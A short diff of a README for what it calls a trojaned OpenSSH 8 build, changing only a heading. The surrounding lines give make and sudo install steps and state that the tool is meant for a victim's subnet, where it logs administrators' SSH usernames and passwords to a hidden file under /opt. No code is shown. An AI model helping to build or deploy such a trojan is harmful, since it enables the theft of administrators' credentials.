@@ -11,7 +11,7 @@ cd openssh8_trojanned
 make
 sudo make install
 
-# WHAT FOR IS THIS ?
+# WHAT THE HELL IS THIS ?
 this trojanned version of openssh can be installed on a victim's subnet which has many ssh access. 
 Everytime the administrator using the ssh client and finish his session using **exit** command, the ssh client will log his username and password at /opt/.../log.txt
 
